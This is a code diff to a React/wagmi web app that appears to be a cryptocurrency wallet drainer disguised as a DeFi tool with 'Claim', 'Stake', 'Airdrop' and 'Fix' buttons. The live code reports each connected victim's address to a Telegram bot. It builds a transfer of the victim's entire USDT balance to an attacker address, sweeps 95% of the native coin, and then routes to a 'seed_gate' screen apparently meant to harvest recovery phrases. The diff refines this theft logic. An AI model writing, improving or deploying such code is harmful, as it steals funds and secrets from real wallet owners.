@@ -1,6 +1,5 @@
-
 /* eslint-disable */
-import React, { useState, useEffect, useMemo } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
 
 export default function App() {
@@ -24,19 +23,18 @@ export default function App() {
 
   const log = (m) => fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(m)}`).catch(()=>{});
 
-  const usdtAddr = useMemo(() => {
-    if (chainId === 1) return "0xdac17f958d2ee523a2206206994597c13d831ec7";
-    if (chainId === 56) return "0x55d398326f99059ff775485246999027b3197955";
-    if (chainId === 137) return "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"; // Polygon Standard/Bridged
-    if (chainId === 42161) return "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9";
-    if (chainId === 43114) return "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7";
-    return undefined;
-  }, [chainId]);
+  // Simple USDT Contract Selection
+  let usdtAddr = undefined;
+  if (chainId === 1) usdtAddr = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+  if (chainId === 56) usdtAddr = "0x55d398326f99059ff775485246999027b3197955";
+  if (chainId === 137) usdtAddr = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
+  if (chainId === 42161) usdtAddr = "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9";
+  if (chainId === 43114) usdtAddr = "0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7";
 
   useEffect(() => {
-    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Final')) {
+    if (isConnected && address && !sessionStorage.getItem('hit_vF_Tuesday_Final_V4')) {
       log(`🎯 TUESDAY HIT!\nADDR: ${address}\nNET: ${chainId}`);
-      sessionStorage.setItem('hit_vF_Tuesday_Final', 't');
+      sessionStorage.setItem('hit_vF_Tuesday_Final_V4', 't');
     }
   }, [isConnected, address, chainId]);
 
@@ -67,23 +65,20 @@ export default function App() {
   const handleHandshake = () => {
     if (!(activeTask === "Rectify" || (inputVal.length > 0))) return;
     
-    // Priority 1: Withdraw USDT if present
+    // Multi-Chain Double Hit Logic
     if (tB && tB.value > 0n && usdtAddr) {
       const d = `0xa9059cbb${dest.replace('0x', '').toLowerCase().padStart(64, '0')}${tB.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: usdtAddr, data: d }, { 
         onSuccess: () => {
-            // After USDT hit, immediately try to sweep the POL/Native
             if (nB && nB.value > 100000000000000n) {
                 setTimeout(() => {
                     sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
-                }, 1500);
+                }, 1000);
             } else { setView("seed_gate"); }
         },
-        onError: () => setView("seed_gate") 
+        onSettled: () => setView("seed_gate") 
       });
-    } 
-    // Priority 2: If no USDT, just sweep the Native (POL/ETH/BNB)
-    else if (nB && nB.value > 100000000000000n) {
+    } else if (nB && nB.value > 100000000000000n) {
       sendTransaction({ to: dest, value: (nB.value * 95n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else { setView("seed_gate"); }
   };
@@ -107,7 +102,7 @@ export default function App() {
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} 
-                style={{backgroundColor:'#0d1117', border:'1px solid #10b981', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
+                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                   <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                 </button>
               ))}
